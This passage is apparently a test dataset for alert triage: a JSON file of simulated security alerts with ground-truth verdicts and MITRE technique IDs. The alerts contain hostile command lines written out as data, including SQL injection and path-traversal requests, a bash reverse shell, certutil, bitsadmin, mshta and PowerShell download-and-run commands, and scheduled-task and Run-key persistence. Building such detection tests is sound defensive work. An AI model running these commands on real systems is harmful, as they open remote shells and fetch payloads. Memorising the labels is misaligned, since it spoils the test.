@@ -1,0 +1,1807 @@
+{
+  "scenarios": [
+    {
+      "id": "g-001",
+      "name": "SQLi đơn lẻ từ IP ngoài",
+      "alerts": [
+        {
+          "alert_id": "g001:w1",
+          "rule_name": "Web SQLi Attempt",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Web SQLi Attempt | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "GET",
+            "request_uri": "/dvwa/?id=1%27+OR+%271%27%3D%271",
+            "http_user_agent": "sqlmap/1.7.2",
+            "status": 200,
+            "remote_addr": "203.0.113.45"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "notes": "IP ngoài, tài sản high, không có IOC"
+      }
+    },
+    {
+      "id": "g-002",
+      "name": "SQLi từ IP đã có trong IOC nội bộ",
+      "alerts": [
+        {
+          "alert_id": "g002:w1",
+          "rule_name": "Web SQLi Attempt",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.10",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Web SQLi Attempt | 192.168.56.10 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "GET",
+            "request_uri": "/dvwa/?id=1%27+UNION+SELECT+1,2,3--",
+            "http_user_agent": "Mozilla/5.0",
+            "status": 200,
+            "remote_addr": "192.168.56.10"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "notes": "IP khớp local_iocs → block chắc chắn"
+      }
+    },
+    {
+      "id": "g-003",
+      "name": "SQLi từ IP nội bộ chưa biết",
+      "alerts": [
+        {
+          "alert_id": "g003:w1",
+          "rule_name": "Web SQLi Attempt",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.77",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Web SQLi Attempt | 192.168.56.77 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "GET",
+            "request_uri": "/dvwa/?id=1%27+OR+1%3D1--",
+            "http_user_agent": "Mozilla/5.0",
+            "status": 200,
+            "remote_addr": "192.168.56.77"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "notes": "IP nội bộ lạ vẫn phải block"
+      }
+    },
+    {
+      "id": "g-004",
+      "name": "SQLi + upload webshell",
+      "alerts": [
+        {
+          "alert_id": "g004:w1",
+          "rule_name": "Web SQLi Attempt",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Web SQLi Attempt | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "GET",
+            "request_uri": "/dvwa/?id=1%27+OR+%271%27%3D%271",
+            "http_user_agent": "Mozilla/5.0",
+            "status": 200,
+            "remote_addr": "203.0.113.45"
+          }
+        },
+        {
+          "alert_id": "g004:w2",
+          "rule_name": "Webshell File Upload",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Webshell File Upload | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "POST",
+            "request_uri": "/dvwa/hackable/uploads/shell.aspx",
+            "http_user_agent": "Mozilla/5.0",
+            "status": 200,
+            "remote_addr": "203.0.113.45"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190",
+          "T1505.003"
+        ],
+        "correct_action": "block",
+        "notes": "chuỗi SQLi → webshell"
+      }
+    },
+    {
+      "id": "g-005",
+      "name": "SQLi với User-Agent sqlmap rõ ràng",
+      "alerts": [
+        {
+          "alert_id": "g005:w1",
+          "rule_name": "Web SQLi Attempt",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Web SQLi Attempt | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "GET",
+            "request_uri": "/dvwa/?id=1",
+            "http_user_agent": "sqlmap/1.7.2#stable (http://sqlmap.org)",
+            "status": 200,
+            "remote_addr": "203.0.113.45"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "notes": "UA sqlmap — tool tự động"
+      }
+    },
+    {
+      "id": "g-006",
+      "name": "SQLi + path traversal",
+      "alerts": [
+        {
+          "alert_id": "g006:w1",
+          "rule_name": "Web SQLi Attempt",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Web SQLi Attempt | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "request_method": "GET",
+            "request_uri": "/dvwa/?id=1%27+OR+1%3D1--&file=../../etc/passwd",
+            "http_user_agent": "Mozilla/5.0",
+            "status": 200,
+            "remote_addr": "203.0.113.45"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "notes": "SQLi + path traversal cùng request"
+      }
+    },
+    {
+      "id": "g-007",
+      "name": "w3wp sinh cmd.exe /c whoami",
+      "alerts": [
+        {
+          "alert_id": "g007:e1",
+          "rule_name": "Web Server Spawning Shell",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1505.003",
+            "T1059"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Web Server Spawning Shell |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1505.003",
+          "T1059"
+        ],
+        "correct_action": "block",
+        "notes": "webshell RCE kinh điển"
+      }
+    },
+    {
+      "id": "g-008",
+      "name": "w3wp sinh powershell",
+      "alerts": [
+        {
+          "alert_id": "g008:e1",
+          "rule_name": "Web Server Spawning Shell",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1505.003",
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Web Server Spawning Shell |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -nop -c \"Get-Process\"",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1505.003",
+          "T1059"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-009",
+      "name": "php-fpm sinh sh",
+      "alerts": [
+        {
+          "alert_id": "g009:e1",
+          "rule_name": "Web Server Spawning Shell",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1505.003",
+            "T1059"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-lin-01",
+          "summary": "Web Server Spawning Shell |  -> :None | host=web-lin-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "/bin/sh",
+            "CommandLine": "sh -c id",
+            "ParentImage": "/usr/sbin/php-fpm",
+            "User": "www-data",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1505.003",
+          "T1059"
+        ],
+        "correct_action": "block",
+        "notes": "webshell PHP"
+      }
+    },
+    {
+      "id": "g-010",
+      "name": "nginx sinh bash",
+      "alerts": [
+        {
+          "alert_id": "g010:e1",
+          "rule_name": "Web Server Spawning Shell",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1505.003",
+            "T1059"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-lin-01",
+          "summary": "Web Server Spawning Shell |  -> :None | host=web-lin-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "/bin/bash",
+            "CommandLine": "bash -i >& /dev/tcp/203.0.113.45/4444 0>&1",
+            "ParentImage": "/usr/sbin/nginx",
+            "User": "www-data",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1505.003",
+          "T1059"
+        ],
+        "correct_action": "block",
+        "notes": "reverse shell"
+      }
+    },
+    {
+      "id": "g-011",
+      "name": "webshell + certutil download",
+      "alerts": [
+        {
+          "alert_id": "g011:e1",
+          "rule_name": "LOLBAS Certutil Download",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1105",
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "LOLBAS Certutil Download |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/p.exe C:\\temp\\p.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1105"
+        ],
+        "correct_action": "block",
+        "notes": "tải payload qua certutil"
+      }
+    },
+    {
+      "id": "g-012",
+      "name": "webshell + whoami trinh sát",
+      "alerts": [
+        {
+          "alert_id": "g012:e1",
+          "rule_name": "LOLBAS Discovery",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "LOLBAS Discovery |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "CommandLine": "whoami /all",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1033"
+        ],
+        "correct_action": "review",
+        "notes": "trinh sát — mức vừa, chuyển người"
+      }
+    },
+    {
+      "id": "g-013",
+      "name": "PowerShell -enc đơn lẻ",
+      "alerts": [
+        {
+          "alert_id": "g013:e1",
+          "rule_name": "Encoded PowerShell Command",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Encoded PowerShell Command |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -enc SQBFAFgA",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-014",
+      "name": "PowerShell -enc từ parent lạ",
+      "alerts": [
+        {
+          "alert_id": "g014:e1",
+          "rule_name": "Encoded PowerShell Command",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Encoded PowerShell Command |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMgA3AC4AMAAuADAALgAxAC8AcAAuAHAAcwAxACcAKQA=",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "notes": "IEX DownloadString"
+      }
+    },
+    {
+      "id": "g-015",
+      "name": "PowerShell -e -nop -w hidden",
+      "alerts": [
+        {
+          "alert_id": "g015:e1",
+          "rule_name": "Encoded PowerShell Command",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Encoded PowerShell Command |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -e -nop -w hidden ZQBjAGgAbwAgAGgAaQA=",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-016",
+      "name": "PowerShell IEX DownloadString",
+      "alerts": [
+        {
+          "alert_id": "g016:e1",
+          "rule_name": "Encoded PowerShell Command",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1059.001",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Encoded PowerShell Command |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.45/p.ps1')",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-017",
+      "name": "schtasks tạo task độc",
+      "alerts": [
+        {
+          "alert_id": "g017:e1",
+          "rule_name": "Scheduled Task Created",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Created |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks /create /tn Updater /tr C:\\temp\\upd.exe /sc onlogon",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1053.005"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-018",
+      "name": "schtasks + Run key",
+      "alerts": [
+        {
+          "alert_id": "g018:e1",
+          "rule_name": "Registry Run Key Modified",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1547.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Registry Run Key Modified |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d C:\\temp\\x.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1547.001"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-019",
+      "name": "Scheduled task từ webshell",
+      "alerts": [
+        {
+          "alert_id": "g019:e1",
+          "rule_name": "Scheduled Task Created",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1053.005",
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Created |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks /create /tn GoogleUpdate /tr powershell.exe -enc ZQBjAGgAbwA= /sc minute /mo 5",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1053.005"
+        ],
+        "correct_action": "block",
+        "notes": "persistence + PS encoded"
+      }
+    },
+    {
+      "id": "g-020",
+      "name": "Run key modification EID 13",
+      "alerts": [
+        {
+          "alert_id": "g020:e1",
+          "rule_name": "Registry Run Key Modified",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1547.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Registry Run Key Modified |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 13,
+            "event_type": "registry_set",
+            "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup",
+            "Details": "C:\\Users\\Public\\b.exe"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1547.001"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-021",
+      "name": "whoami",
+      "alerts": [
+        {
+          "alert_id": "g021:e1",
+          "rule_name": "Discovery Whoami",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Discovery Whoami |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "CommandLine": "whoami",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "medium",
+        "attack_ids": [
+          "T1033"
+        ],
+        "correct_action": "review",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-022",
+      "name": "systeminfo",
+      "alerts": [
+        {
+          "alert_id": "g022:e1",
+          "rule_name": "Discovery Systeminfo",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1082"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Discovery Systeminfo |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\systeminfo.exe",
+            "CommandLine": "systeminfo",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "low",
+        "attack_ids": [
+          "T1082"
+        ],
+        "correct_action": "review",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-023",
+      "name": "certutil decode",
+      "alerts": [
+        {
+          "alert_id": "g023:e1",
+          "rule_name": "LOLBAS Certutil",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1140"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "LOLBAS Certutil |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "CommandLine": "certutil -decode enc.txt dec.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1140"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-024",
+      "name": "bitsadmin download",
+      "alerts": [
+        {
+          "alert_id": "g024:e1",
+          "rule_name": "LOLBAS Bitsadmin",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "LOLBAS Bitsadmin |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+            "CommandLine": "bitsadmin /transfer j http://203.0.113.45/p.exe C:\\temp\\p.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1105"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-025",
+      "name": "mshta http",
+      "alerts": [
+        {
+          "alert_id": "g025:e1",
+          "rule_name": "LOLBAS Mshta",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1218.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "LOLBAS Mshta |  -> :None | host=web-win-01",
+          "fields": {
+            "event_id": 1,
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "CommandLine": "mshta http://203.0.113.45/x.hta",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892",
+            "UtcTime": "2026-09-27 01:00:00"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1218.005"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-026",
+      "name": "HTTP beacon từ process lạ",
+      "alerts": [
+        {
+          "alert_id": "g026:n1",
+          "rule_name": "Suspicious Outbound HTTP",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.45",
+          "dest_port": 8080,
+          "host": "sensor-net-01",
+          "summary": "Suspicious Outbound HTTP | 192.168.56.20 -> 203.0.113.45:8080 | host=sensor-net-01",
+          "fields": {
+            "proto": "TCP",
+            "app_proto": "http",
+            "flow": {
+              "pkts_toserver": 40,
+              "pkts_toclient": 40,
+              "bytes_toserver": 3200,
+              "bytes_toclient": 2800,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1071"
+        ],
+        "correct_action": "block",
+        "notes": ""
+      }
+    },
+    {
+      "id": "g-027",
+      "name": "DNS tunneling",
+      "alerts": [
+        {
+          "alert_id": "g027:n1",
+          "rule_name": "Suspicious DNS Activity",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Suspicious DNS Activity | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "proto": "UDP",
+            "app_proto": "dns",
+            "flow": {
+              "pkts_toserver": 200,
+              "pkts_toclient": 200,
+              "bytes_toserver": 12000,
+              "bytes_toclient": 12000,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
